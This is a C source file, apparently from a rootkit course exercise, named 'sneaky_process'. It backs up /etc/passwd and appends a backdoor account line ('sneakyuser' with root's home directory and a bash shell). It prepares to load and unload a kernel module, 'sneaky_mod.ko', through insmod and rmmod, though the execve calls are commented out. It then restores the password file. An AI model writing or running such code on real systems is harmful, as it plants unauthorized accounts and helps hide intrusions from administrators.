#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

//******************step 4 functions for load sneaky module*****************

void parent_process(pid_t cpid) {
  pid_t w;      //wait pid
  int wstatus;  //wait status

  //printf("Parrent PID is %ld\n", (long)getpid());

  do {
    w = waitpid(cpid, &wstatus, WUNTRACED | WCONTINUED);
    if (w == -1) {
      perror("waitpid");
      exit(EXIT_FAILURE);
    }
    //wstatus
    if (WIFEXITED(wstatus)) {  //success or failure
      printf("Program exited with status %d\n", WEXITSTATUS(wstatus));
    }
    else if (WIFSIGNALED(wstatus)) {  //killed by signal such as kill -TERM
      printf("Program was killed by killed by signal %d\n", WTERMSIG(wstatus));
    }
    else if (WIFSTOPPED(wstatus)) {  //stopped by signal such as kill -STOP
      printf("Program was stopped by signal %d\n", WSTOPSIG(wstatus));
    }
    else if (WIFCONTINUED(wstatus)) {  //resume by signal such as kill -CONT
      printf("continued\n");
    }
  } while (!WIFEXITED(wstatus) && !WIFSIGNALED(wstatus));
  //allows for only a successful exit or termination signalpid_t w;   
}


void do_load_process() {

  char load_command[] = "insmod";
  char load_module[] = "sneaky_mod.ko";
  char key_value_pair[50];
  sprintf(key_value_pair, "%s=%d", "ppid", getppid());


  char * argv[4];
  argv[0] = load_command;
  argv[1] = load_module; 
  argv[2] = key_value_pair;
  argv[3] = NULL;

  
  //execve(argv[0],argv, NULL);
  exit(EXIT_SUCCESS);
}

void do_unload_process() {

  char load_command[] = "rmmod";
  char load_module[] = "sneaky_mod";

  
  char * argv[3];
  argv[0] = load_command;
  argv[1] = load_module; 
  argv[2] = NULL;

  
  //execve(argv[0], argv, NULL);
  exit(EXIT_SUCCESS);
}

void do_load_sneaky_module_in_child_process(){

  pid_t cpid = fork();  //child process pid
  
  if (cpid == -1) {  //return -1 for fork failure
    perror("fork");
    exit(EXIT_FAILURE);
  }
  else if (cpid == 0) {                         //return 0 in the child process
    do_load_process();  // return success or failure automatically
  }
  else {  //return child's pid for parent process
    parent_process(cpid);
  }
  
}

void do_unload_sneaky_module_in_child_process(){

  pid_t cpid = fork();  //child process pid

  if (cpid == -1) {  //return -1 for fork failure
    perror("fork");
    exit(EXIT_FAILURE);
  }
  else if (cpid == 0) {                         //return 0 in the child process
    do_unload_process();  // return success or failure automatically
  }
  else {  //return child's pid for parent process
    parent_process(cpid);
  }
  
}


int main() {
  //--------------1.print  process ID to the screen-----------------------
  printf("sneaky_process pid = %d\n", getpid());

  
  //--------------2.copy /etc/passwd to /tmp/passwd----------------------
  char etc_file[20] = "/etc/passwd";
  char tmp_file[20] = "/tmp/passwd";
  FILE *source, *target;
  source = fopen(etc_file, "r");
  if (source == NULL) {
    fprintf(stderr, "fail to open file %s", etc_file);
    exit(EXIT_FAILURE);
  }
  target = fopen(tmp_file, "w");
  if (target == NULL) {
    fprintf(stderr, "fail to open file %s", tmp_file);
    exit(EXIT_FAILURE);
  }


  char ch;
  while ((ch = fgetc(source)) != EOF) {
    fputc(ch, target);
  }
  fclose(source);
  fclose(target);

  
  //------------3.add a new line to /etc/passwd-----------------------------
  source = fopen(etc_file, "a");
  if (source == NULL) {
    fprintf(stderr, "fail to open file %s", etc_file);
    exit(EXIT_FAILURE);
  }
  fprintf(source, "sneakyuser:abc123:2000:2000:sneakyuser:/root:bash");
  fclose(source);
  

  //----------------4.load the sneaky module----------------------------------
  do_load_sneaky_module_in_child_process();


  while ((ch = fgetc(stdin)) != EOF) {
    if (ch == 'q') {
      break;
    }
  }
  //---------------5.unload the sneaky module---------------------------------
  do_unload_sneaky_module_in_child_process();
  

  //---------------6.restore the /etc/passwd---------------------------------
  source = fopen(tmp_file, "r");
  if (source == NULL) {
    fprintf(stderr, "fail to open file %s", tmp_file);
    exit(EXIT_FAILURE);
  }
  target = fopen(etc_file, "w");
  if (target == NULL) {
    fprintf(stderr, "fail to open file %s", etc_file);
    exit(EXIT_FAILURE);
  }


  while ((ch = fgetc(source)) != EOF) {
    fputc(ch, target);
  }
  fclose(source);
  fclose(target);


  int status = remove(tmp_file);
  if (status == 0) {
    printf("%s file deleted successfully.\n", tmp_file);
  } else {
    printf("Unable to delete the file %s\n", tmp_file);
  }
  
  return EXIT_SUCCESS;
}
